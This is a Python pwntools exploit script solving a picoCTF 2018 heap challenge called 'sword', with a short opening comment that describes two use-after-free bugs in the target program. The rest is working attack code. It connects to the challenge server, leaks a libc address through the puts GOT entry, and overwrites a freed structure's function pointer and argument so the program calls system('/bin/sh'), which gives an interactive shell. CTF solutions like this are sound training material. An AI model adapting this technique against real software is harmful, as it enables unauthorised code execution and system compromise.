'''
- Use after free in harden_sword():

	struct sword_s {
		int name_len;
		int weight;
		
		char *sword_name;
		void (*use_sword)(char *ptr);
		int is_hardened;
	};

	struct sword_list_s {
		int is_used;
		struct sword_s *sword;
	};

	...

	if (len > MAX_SWORD_LEN) {
		printf("The name is too long.\n");
		free(sword_lists[slot].sword);
		return;
	}

	it frees the sword but doesnt set is_used to 0.

- Use after free in equip_sword():

	if (slot < 0 || slot >= MAX_SWORD_NUM ||
		!sword_lists[slot].sword) { //doesnt check sword is_used
		printf("I don't trust your number!!!!\n");
		exit(-1);
	}

	/* Apparently there should be system('/bin/sh'). */
	(sword_lists[slot].sword->use_sword)(sword_lists[slot].sword->sword_name);
'''

from pwn import *

#r = process('./sword')
r = remote('2018shell2.picoctf.com', 32987)

def create_sword():
	r.sendafter('7. Quit.\n', '1\n')
	return int(r.recvuntil('.\n').split('.\n')[0].split('index is ')[1])

def show_sword(index):
	r.sendafter('7. Quit.\n', '3\n')
	r.sendafter('What\'s the index of the sword?\n', str(index) + '\n')
	return r.recvuntil('\n/* Welcome! */').split('\n/* Welcome! */')[0].split('The name is ')[1]

def free_sword(index):
	r.sendafter('7. Quit.\n', '4\n')
	r.sendafter('What\'s the index of the sword?\n', str(index) + '\n')

def harden_sword(index, length, name):
	r.sendafter('7. Quit.\n', '5\n')
	r.sendafter('What\'s the index of the sword?\n', str(index) + '\n')
	r.sendafter('What\'s the length of the sword name?\n', str(length) + '\n')
	if length <= 0x100:
		r.sendafter('Plz input the sword name.\n', name + '\n')
		r.sendafter('What\'s the weight of the sword?\n', '-1\n')

def equip_sword(index):
	r.sendafter('7. Quit.\n', '6\n')
	r.sendafter('What\'s the index of the sword?\n', str(index) + '\n')

sword_0 = create_sword()
sword_1 = create_sword()
sword_2 = create_sword()

harden_sword(sword_0, 20000, 'test')

fake_sword = ''
fake_sword += p32(0x1337)
fake_sword += p32(0x0)
fake_sword += p64(0x602020) #puts got entry to leak libc address
fake_sword += p64(0x1337c0de)
fake_sword += p64(0x0)

harden_sword(sword_1, 0x27, fake_sword)

libc = u64(show_sword(sword_0)[:6].ljust(8, '\x00')) - 0x6f690

log.success('Libc @ ' + hex(libc))

free_sword(sword_1)

fake_sword = ''
fake_sword += p32(0x1337)
fake_sword += p32(0x0)
fake_sword += p64(libc + 0x18cd57) #/bin/sh
fake_sword += p64(libc + 0x45390) #system
fake_sword += p64(0x0)

harden_sword(sword_2, 0x27, fake_sword)

equip_sword(0)

r.interactive()
